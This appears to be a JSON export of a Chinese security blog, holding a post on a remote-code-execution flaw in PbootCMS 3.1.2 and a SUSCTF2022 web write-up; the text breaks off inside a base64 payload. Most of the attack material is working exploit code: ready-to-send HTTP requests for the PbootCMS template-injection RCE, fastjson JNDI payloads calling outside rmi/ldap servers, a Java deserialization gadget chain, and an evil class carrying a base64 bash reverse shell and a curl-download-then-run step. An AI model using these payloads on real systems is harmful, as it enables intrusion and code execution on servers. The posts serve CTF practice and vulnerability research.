{"pages":[{"title":"about","text":"这里没有高深的知识，只有零散的笔记，或是直接摘抄，或是简单总结，只为在我「暂时失忆」时，帮自己度过难关，如果能帮助到你我会感到很高兴。 关于我 ID: suanve ID: 请妹子不要把咖啡泼在我的macbook上 热衷于CTF,赛场上看到suanve就是我啦.","link":"/about/index.html"}],"posts":[{"title":"pboot cms V3.1.2 &quot;虚假的无文件落地RCE&quot;","text":"Auth: EDI安全/suanve 0 前言上次电脑送修我就买了个mini 一直用macmini 结果 本子修好以后拿回来也忘了看 苹果售后把我系统分区重装了 导致没有php环境 brew在macos 12上也不能正常工作 这就直接导致西湖比赛的时候我vardump调试也没调出个所以然（还被大佬喷 （确实 挺简单的一个漏洞 今天回XX以后 调试了一下 1 分析根据历史漏洞可以知道在前台 有一个 ssti 搜索eval可以找到eval('if(' . $matches[1][$i] . '){$flag=&quot;if&quot;;}else{$flag=&quot;else&quot;;}'); eval出自parserIfLabel函数 找parserIfLabel调用可以找到parserAfter 找parserAfter调用可以找到SearchController-index 在parserAfter函数中 可以看到获取了keyword关键字 （有的初学者可能就觉得问题出现在这里了 我比赛的时候也是犯了这个错误 实际上这里的逻辑写的挺好的 取参的时候 会通过正则来校验输入 如果不符合就把传入的数据置空 恶意操作基本进不去 （但是。。。开发者在加载模板的时候 其实已经把我们的payload放入$content了所以get里的限制就限制了个寂寞 开始分析 先把payload带进去 在刚加载（渲染）完模板的时候 可以看到已经把恶意语句加载进来了 所以他的get函数中几个限制完全没起到作用（其实漏洞点不在keyword关键字 后面会详细说 可以看到 get方法内到各种限制操作 确实把不符合规则的keyword给置null了 但是其实content里的还在 所以这里跟进看一下最初始的渲染模板部分 首先在这里是加载模板 渲染基础部分生成缓存 然后包含缓存后 在这里发现了 echo URL; 这里保存的还是完整url 问题就是出在这里了 继续往下看 可以看到$content = ob_get_contents(); 行吧 直接把url输出然后保存到$content里了。 即使下面他多次获取keyword时试图不把违规字符带入模板 都没有一点意义 细心的小伙伴可能发现了 这个问题好像是出在二维码生成标签这个位置的 而在进入我们关键点之前 就有这么一次操作 跟进去看一眼 嗯 他匹配了我们二维码这个标签的内容 然后将其生成二维码链接 （所以大家知道了吧 漏洞实际上出在他对模板的渲染部分上 这就导致所有和模板渲染的地方 都会存在这个问题（其实就是只要有二维码分享的页面 都可以触发我们后面的payload 所以我们想利用这里的话 只需要针对上面的正则/\\{pboot:qrcode(\\s+[^}]+)?\\}/做文章就好了 我们提取出关键的这一行html 发现会被完整的匹配到 结合正则很容易理解 括号成对嘛 所以我们给他加一个}他不就匹配不到我们的payload了 至此 我们已经完整的解决了{}带入模板的问题 接下来就直接把经过各种操作的$content带到了parserIfLabel 函数 也就是存在eval的地方 百度找找历史文章分析就知道无非就是绕那几个正则 (推荐一个网站 https://regex101.com/ 挺好用的 牵扯到之该cms之前的几个漏洞 我们可以知道完成以下两点即可实现rce 绕过函数执行正则 绕过参数正则 一个个来 绕过函数执行正则说几个知识点 大家都懂得 12345func(1);func (1);func/**/(1);func (1); pbootcms的函数执行检测正则长这样 ([\\w]+)([\\x00-\\x1F\\x7F\\/\\*\\&lt;\\&gt;\\%\\w\\s\\\\\\\\]+)?\\( 大概了解一下以后 嗯。。。还想啥 直接fuzz就好啦 ？？ 咋四种都不行 但是大家别忘了啊 第三种有注释啊/**/ 你只匹配([\\w+])那我加一个-你还能匹配到吗？你匹配不到了吧。 绕过参数获取的正则这里我没有详细的去研究怎么绕关键字意义不大 毕竟是ctfer 用点 ctf技巧就派上用场了（网上的漏洞分析有两个关键函数 可以直接用 get_lg和get_backurl 他俩都在function.php get_lg 是从 cookie lg字段取 12345678910// 获取当前语言并进行安全处理Åfunction get_lg(){ $lg = cookie('lg'); if (! $lg || ! preg_match('/^[\\w\\-]+$/', $lg)) { $lg = get_default_lg(); cookie('lg', $lg); } return $lg;} get_backurl从get取 12345678910111213// 获取返回URLfunction get_backurl(){ if (! ! $backurl = get('backurl')) { if (isset($_SERVER[&quot;QUERY_STRING&quot;]) &amp;&amp; ! ! get('p')) { return &quot;&amp;backurl=&quot; . $backurl; } else { return &quot;?backurl=&quot; . $backurl; } } else { return; }} 所以使用这两个函数 搭配函数执行方式 就能绕过正则 2 利用:123456789101112131415161718192021GET /index.php/keyword?keyword=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&amp;backurl=;id HTTP/1.1Host: localhost:80User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloaUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Length: 2 任意页面皆可rce根据刚刚所说的 他实际上不是search控制器的问题所以任意页面都可以调用 123456789101112131415161718192021GET /index.php/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&amp;backurl=;id HTTP/1.1Host: localhost:80User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloaUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Length: 2 123456789101112131415161718192021GET /?member/login/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&amp;backurl=;id HTTP/1.1Host: localhost:80User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloaUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Length: 2 漏洞的挖掘大多数都是站在前人的肩膀上 我也不例外 这样一个调一调就出来了的洞 大家应该都有 公开也没什么不好 x 有关西湖论剑ctf有disablefunction和openbasedir php7.2开始弃用了create_function但是没移除 还是可以用的 所以调用 https://github.com/mm0r1/exploits/tree/master/php-filter-bypass “pwn”一下就好了 欢迎关注”EDI安全”","link":"/2021/11/22/pboot-cms-V3-1-2-%E8%99%9A%E5%81%87%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0RCE/"},{"title":"SUSCTF2022-web-writeup","text":"Auth: EDISEC Team本场比赛可谓是”非预期的非预期次方” fxxkcors123456789fxxkcorschallenge:http://124.71.205.122:10002/report:http://123.60.71.144:3000/fxxkcorshttp://159.138.56.26:3000/fxxkcorshttp://119.13.125.234:3000/fxxkcors 应该是要绕CORS 让BOT修改我的用户为admin Origin无效 没找到有xss 写 POST发json 让BOT打也没修改成功 我也不知道为啥。。。 1234567891011BOT特征connect to [10.7.100.194] from ecs-119-13-125-234.compute.hwclouds-dns.com [119.13.125.234] 37878GET / HTTP/1.1Host: 36.255.221.156:902Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/99.0.4844.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: en-US 蹭车出了（真的是笑死 共享环境就这点不好 baby gadget v1.0123baby gadget v1.0bypass and bypasshttp://124.71.187.127:20012/ bp绕过重定向 可以发现admin/download.jsp 下载下来是一个依赖包 fastjson 目录扫描，访问到admin/路由 会自动重定向 弱密码登录 admin admin123 fastjson触发点 123456789101112131415161718192021222324252627POST /admin/mailbox.jsp HTTP/1.1Host: 124.71.187.127:20012User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 272Origin: http://124.71.187.127:20012Connection: closeReferer: http://124.71.187.127:20012/admin/mailbox.jsp?q=123123123Cookie: JSESSIONID=197ACA802BB2F2298D4CA7DDA7154D85Upgrade-Insecure-Requests: 1Origin: foo.example.orginputtext={ &quot;a&quot;:{ &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; }, &quot;b&quot;:{ &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://1.116.218.142:9999/Object&quot;, &quot;autoCommit&quot;:true }} 可能需要根据那个lib 挖链子 但是我选择摆烂 工具梭哈 写个内存马 然后{cat,flag} 绕过rasp检测 1234567891011121314151617181920212223242526POST /admin/mailbox.jsp HTTP/1.1Host: 124.71.187.127:20012User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 294Origin: http://124.71.187.127:20013eConnection: closeReferer: http://124.71.187.127:20013/admin/mailbox.jsp?q=123123123Cookie: JSESSIONID=09C31AC61C1C265773A55D835D085415Upgrade-Insecure-Requests: 1Origin: foo.example.orginputtext={ &quot;a&quot;:{ &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; }, &quot;b&quot;:{ &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://1.116.218.142:1389/TomcatBypass/TomcatMemshell&quot;, &quot;autoCommit&quot;:true }} 后续查看依赖 baby gadget v1.0’s rrrevengefastjson变为1.2.48，其他没变，改一下payload {“@type”:”org.apache.xbean.propertyeditor.JndiConverter”,”AsText”:”ldap://xx.xx.xx.xx:7771/Exploit”} 成功访问类，但没有弹回来shell，跟着上题的思路，同样写个内存马就完事了 {“@type”:”org.apache.xbean.propertyeditor.JndiConverter”,”AsText”:”ldap://xx.xx.xx.xx:7771/SRain”} 抓一下flag baby gadget v2.0登录是个XML 猜测XXE 不符合xml标准爆出 Get out hacker! 提示了hint.txt 尝试dtd+无回显 读取到hint，下载压缩包 有waf限制 http://124.71.189.248:20012/bf2dcf6664b16e0efe471b2eac2b54b2 但是还是知道了是直接body反序列化 试了一晚上 使用其他Class绕过HashMap就可以了 poc如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import org.apache.commons.collections.Bag;import org.apache.commons.collections.FastHashMap;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.bag.HashBag;import org.apache.commons.collections.bag.TransformedBag;import org.apache.commons.collections.bag.TransformedSortedBag;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.*;/** * @author MoonBack * @date 2022/2/27 16:07 */public class susctf { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]{ ClassPool.getDefault().get(evil.class.getName()).toBytecode() }); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] { Templates.class }, new Object[] { obj }) }; Transformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map hashMap = new TreeMap(); // 构造出恶意Map Map evilMap = LazyMap.decorate(hashMap, chainedTransformer); // 用恶意Map初始化TiedMapEntry类 TiedMapEntry tiedMapEntry = new TiedMapEntry(evilMap, &quot;key&quot;); // 将构造好的TiedMapEntry对象作为HashMap的一个key Map evalMap = new FastHashMap(); // put的时候会触发Map：key的get方法，所以先构造一个无害的ChainedTransformer对象用来初始化，之后再用反射修改值 evalMap.put(tiedMapEntry, &quot;123&quot;); // 注意这里 evilMap.remove(&quot;key&quot;); // 用反射设置把恶意构造的Transformer Field declaredFields = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); // 设置权限 declaredFields.setAccessible(true); declaredFields.set(chainedTransformer, transformers); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(evalMap); oos.close(); System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray()))); // 本地测试触发// System.out.println(barr);// ObjectInputStream ois = new SafeInputStream(new ByteArrayInputStream(barr.toByteArray()));// Object o = (Object) ois.readObject(); }} 反弹shell是失败的。。。所以先curl写文件 然后再执行它 通过curl把flag带出来 123456789101112131415161718192021222324/** * @author MoonBack * @date 2021/12/15 15:00 */import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class evil extends AbstractTranslet { public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} public evil() throws Exception {// Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zNi4yNTUuMjIxLjE1Ni85ODAxIDA+JjE=}|{base64,-d}|{bash,-i}&quot;);// Runtime.getRuntime().exec(&quot;curl -o /tmp/suanve http://36.255.221.156:901/1 &quot;); Runtime.getRuntime().exec(&quot;bash /tmp/suanve&quot;);// Runtime.getRuntime().exec(&quot;calc&quot;); }} 1 下载文件 1234567891011121314POST /bf2dcf6664b16e0efe471b2eac2b54b2 HTTP/1.1Host: 124.71.189.248:20012User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1cmd: idOrigin: foo.example.orgContent-Type: application/x-www-form-urlencodedContent-Length: 3830rO0ABXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuRmFzdEhhc2hNYXDPVCYVgxGIjgIAAloABGZhc3RMAANtYXB0ABNMamF2YS91dGlsL0hhc2hNYXA7eHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4AHNxAH4AAj9AAAAAAAAMdwgAAAAQAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2tleXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAAAnNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB%2bAAZ4cHZyADdjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UckFYRmlsdGVyAAAAAAAAAAAAAAB4cHNyAD5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H%2bkhtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAYTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX%2bAYIVOACAAB4cAAABXXK/rq%2bAAAANAAuCgAHAB8KACAAIQgAIgoAIAAjCAAkBwAlBwAmAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMZXZpbDsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ%2bAQADKClWBwAoAQAKU291cmNlRmlsZQEACWV2aWwuamF2YQwAGgAbBwApDAAqACsBADBjdXJsIC1vIC90bXAvc3VhbnZlIGh0dHA6Ly8zNi4yNTUuMjIxLjE1Njo5MDEvMSAMACwALQEAEGJhc2ggL3RtcC9zdWFudmUBAARldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABgAHAAAAAAADAAEACAAJAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAMAAwAAAAgAAMAAAABAA0ADgAAAAAAAQAPABAAAQAAAAEAEQASAAIAEwAAAAQAAQAUAAEACAAVAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAOAAwAAAAqAAQAAAABAA0ADgAAAAAAAQAPABAAAQAAAAEAFgAXAAIAAAABABgAGQADABMAAAAEAAEAFAABABoAGwACAAoAAABNAAIAAQAAABcqtwABuAACEgO2AARXuAACEgW2AARXsQAAAAIACwAAABIABAAAABAABAATAA0AFAAWABYADAAAAAwAAQAAABcADQAOAAAAEwAAAAQAAQAcAAEAHQAAAAIAHnB0ABJIZWxsb1RlbXBsYXRlc0ltcGxwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBzcgARamF2YS51dGlsLlRyZWVNYXAMwfY%2bLSVq5gMAAUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHBwdwQAAAAAeHh0AAMxMjN4 2 执行文件 123456789101112131415POST /bf2dcf6664b16e0efe471b2eac2b54b2 HTTP/1.1Host: 124.71.189.248:20012User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1cmd: idOrigin: foo.example.orgContent-Type: application/x-www-form-urlencodedContent-Length: 3742rO0ABXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuRmFzdEhhc2hNYXDPVCYVgxGIjgIAAloABGZhc3RMAANtYXB0ABNMamF2YS91dGlsL0hhc2hNYXA7eHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4AHNxAH4AAj9AAAAAAAAMdwgAAAAQAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2tleXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAAAnNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB%2bAAZ4cHZyADdjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UckFYRmlsdGVyAAAAAAAAAAAAAAB4cHNyAD5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H%2bkhtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAYTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX%2bAYIVOACAAB4cAAABTLK/rq%2bAAAANAAsCgAGAB4KAB8AIAgAIQoAHwAiBwAjBwAkAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMZXZpbDsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGP